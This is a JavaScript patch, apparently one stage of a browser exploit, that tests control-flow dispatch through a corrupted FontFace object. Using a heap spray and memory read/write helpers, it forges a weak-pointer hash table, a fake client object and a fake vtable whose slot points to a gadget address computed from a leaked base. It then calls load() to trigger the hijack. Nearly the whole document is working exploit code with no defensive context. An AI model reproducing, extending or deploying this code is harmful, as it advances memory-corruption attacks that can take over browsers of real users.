// V18 Patch: Timer-Free Control Dispatch Test
// Apply this to V17's dispatch section (around line 907-1048)

// Replace the V17B dispatch section with this:

/* ==== V18: TIMER-FREE CONTROL DISPATCH (Council-Recommended) ====
 *
 * PHASE 1: Make load() survivable (non-table state)
 *   - Face status: Pending (0)
 *   - One valid source already reporting Source::Loading
 *   - FontLoadTimingOverride::Block (1)
 *   - Takes Loading transition → one client iteration → returns from pump()
 *   - NO Timer operations (infinite block timing)
 *
 * PHASE 2: Progress through table states (hold non-table state fixed)
 *   1. m_table == nullptr (empty set control)
 *   2. All-empty table: metadata {0,0,7,8}, eight zero buckets
 *   3. Weak-null test: metadata {0,1,7,8}, one live bucket with m_ptr=null
 *   4. Live-client test: metadata {0,1,7,8}, one live bucket with non-null m_ptr
 *
 * INSTRUMENTATION:
 *   - Synchronous post-load() markers
 *   - Final status reads
 *   - Table metadata/bucket readbacks
 *   - Verify expected state changes
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V18-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== PHASE 1: SETUP TIMER-FREE FACE ==== */
      bs('V18-SETUP-TIMER-FREE');

      /* Face status = Pending (0) */
      hitBuf[0x82]=0;

      /* FontLoadTimingOverride = Block (1) - infinite block period, no timer */
      hitBuf[0x87]=1;

      /* Blanket override bytes for safety */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;

      /* Timer region zeroed (inactive, but not used in this control) */
      for(var tz=0x88;tz<=0xBF;tz++)hitBuf[tz]=0;

      /* Hash-table object header at +0x60..0x67: {3, 0x200} from real face
       * (operation counters, not used when m_table is null) */
      hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
      hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;

      bs('V18-FACE-SETUP-status=Pending-override=Block');

      /* ==== PHASE 2: SETUP TABLE BASED ON PHASE PARAMETER ==== */
      var PHASE=(function(){var m=/[?&]phase=([0-9]+)/.exec(location.search);return m?parseInt(m[1],10):1;})();
      var tblPtr=0n;

      bs('V18-PHASE='+PHASE);

      switch(PHASE){
        case 1:
          /* State 1: m_table == nullptr (empty set control) */
          bs('V18-PHASE1-m_table=nullptr');
          for(var i=0;i<8;i++)hitBuf[0x58+i]=0;
          tblPtr=0n;
          break;

        case 2:
          /* State 2: All-empty table {0,0,7,8} */
          bs('V18-PHASE2-all-empty');
          tblPtr=S+0x28n;

          /* Metadata: {deletedCount=0, keyCount=0, tableSizeMask=7, tableSize=8} */
          put32(sv,0x18,0);      /* deletedCount = 0 */
          put32(sv,0x1C,0);      /* keyCount = 0 */
          put32(sv,0x20,7);      /* tableSizeMask = 7 */
          put32(sv,0x24,8);      /* tableSize = 8 */

          /* All 8 buckets = 0 (empty) */
          for(var i=0;i<8;i++)dvSetBig(sv,0x28+i*8,0n);

          /* Install table pointer */
          for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number((tblPtr>>BigInt(hb*8))&0xFFn);
          bs('V18-TABLE-ALL-EMPTY-T='+tblPtr.toString(16));
          break;

        case 3:
          /* State 3: Weak-null test {0,1,7,8} - one live bucket with m_ptr=null */
          bs('V18-PHASE3-weak-null');
          tblPtr=S+0x28n;

          /* Metadata: {deletedCount=0, keyCount=1, tableSizeMask=7, tableSize=8} */
          put32(sv,0x18,0);      /* deletedCount = 0 */
          put32(sv,0x1C,1);      /* keyCount = 1 */
          put32(sv,0x20,7);      /* tableSizeMask = 7 */
          put32(sv,0x24,8);      /* tableSize = 8 */

          /* WeakPtrImpl at S+0x00:
           * +0x00: refcount = 1 (lo=1, hi=1 for weak)
           * +0x08: m_ptr = 0 (null - this is the weak-null test)
           */
          dvSetBig(sv,0x00,0x100000001n);  /* refcount = 1 */
          dvSetBig(sv,0x08,0n);            /* m_ptr = null */

          /* Bucket 0: WeakPtrImpl pointer (S) */
          dvSetBig(sv,0x28,S);

          /* Buckets 1-7: empty (0) */
          for(var i=1;i<8;i++)dvSetBig(sv,0x28+i*8,0n);

          /* Install table pointer */
          for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number((tblPtr>>BigInt(hb*8))&0xFFn);
          bs('V18-TABLE-WEAK-NULL-T='+tblPtr.toString(16)+'-bucket0='+S.toString(16));
          break;

        case 4:
          /* State 4: Live-client test {0,1,7,8} - one live bucket with non-null m_ptr */
          bs('V18-PHASE4-live-client');
          tblPtr=S+0x28n;

          /* Metadata: {deletedCount=0, keyCount=1, tableSizeMask=7, tableSize=8} */
          put32(sv,0x18,0);      /* deletedCount = 0 */
          put32(sv,0x1C,1);      /* keyCount = 1 */
          put32(sv,0x20,7);      /* tableSizeMask = 7 */
          put32(sv,0x24,8);      /* tableSize = 8 */

          /* WeakPtrImpl at S+0x00:
           * +0x00: refcount = 1
           * +0x08: m_ptr = fake client at S+0x68
           */
          dvSetBig(sv,0x00,0x100000001n);  /* refcount = 1 */
          dvSetBig(sv,0x08,S+0x68n);       /* m_ptr = fake client */

          /* Fake client at S+0x68:
           * +0x00: vtable = fake vtable at S+0xA8
           * +0x08: impl back-pointer (not used in this test)
           * +0x10: m_backing (not used in this test)
           * +0x18: m_loadedPromise (not used in this test)
           */
          dvSetBig(sv,0x68+0x00,S+0xA8n);  /* client vtable = fake */
          dvSetBig(sv,0x68+0x08,0n);
          dvSetBig(sv,0x68+0x10,0n);
          dvSetBig(sv,0x68+0x18,0n);

          /* Fake vtable at S+0xA8:
           * slot 0: noop (ref)
           * slot 1: noop (deref)
           * slot 2: noop
           * slot 3: fontStateChanged gadget (FSG)
           * slots 4-7: noop
           */
          for(var vs=0;vs<8;vs++)dvSetBig(sv,0xA8+vs*8,NOPG);
          dvSetBig(sv,0xA8+0x18,FSG);      /* slot 3 = fontStateChanged */

          /* Bucket 0: WeakPtrImpl pointer (S) */
          dvSetBig(sv,0x28,S);

          /* Buckets 1-7: empty (0) */
          for(var i=1;i<8;i++)dvSetBig(sv,0x28+i*8,0n);

          /* Install table pointer */
          for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number((tblPtr>>BigInt(hb*8))&0xFFn);
          bs('V18-TABLE-LIVE-CLIENT-T='+tblPtr.toString(16)+'-client='+S.toString(16)+'+0x68');
          break;

        default:
          bs('V18-SKIP-invalid-phase');
          throw 'invalid phase';
      }

      bs('V18-INSTALLED-phase='+PHASE+'-tblPtr='+hex(tblPtr));

      /* ==== THE DISPATCH: faces[zi].load() ==== */
      bs('V18-LOAD-PRE');
      var loadReturned=false;
      var loadThrew=false;
      var loadError='';

      try{
        faces[zi].load();
        loadReturned=true;
        bs('V18-LOAD-RETURNED');
      }catch(e){
        loadThrew=true;
        loadError=String(e&&e.message?e.message:'?');
        bs('V18-LOAD-THREW-'+loadError);
      }

      /* ==== POST-DISPATCH INSTRUMENTATION ==== */
      bs('V18-POST-LOAD-returned='+loadReturned+'-threw='+loadThrew);

      /* Final status read */
      var finalStatus=hitBuf[0x82];
      bs('V18-STATUS-AFTER='+finalStatus+'-expected='+(PHASE===1?0:4));

      /* Table metadata readback (if table exists) */
      if(PHASE>=2&&tblPtr>0n){
        var metaH=readAt(tblPtr-0x10n,0x10);
        bs('V18-TABLE-META-AFTER='+metaH);

        /* Expected after weak-null cleanup: {1,0,7,8} */
        if(PHASE===3){
          var deletedCount=parseInt(metaH.substr(0,8),16);
          var keyCount=parseInt(metaH.substr(8,8),16);
          bs('V18-WEAK-NULL-RESULT-deleted='+deletedCount+'-keyCount='+keyCount+'-expected=1,0');
        }
      }

      /* Witness check */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('WIT-dispatch-WRITE-'+diffs.slice(0,8).join('|'));
      else bs('WIT-dispatch-nowrite');

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V18-RESTORED');

      /* Verdict */
      if(loadReturned){
        verd('ok','V18 Phase '+PHASE+' dispatch complete');
        bs('V18-DONE-phase='+PHASE+'-SUCCESS');
      }else{
        verd('err','V18 Phase '+PHASE+' dispatch failed');
        bs('V18-DONE-phase='+PHASE+'-FAILED');
      }

    }else bs('V18-SKIP-bad-idx');
  }else bs('V18-SKIP-missing-data');
}catch(e18){bs('V18-ERR-'+String(e18&&e18.message?e18.message:'?'));}
/* ==== V18 END ==== */
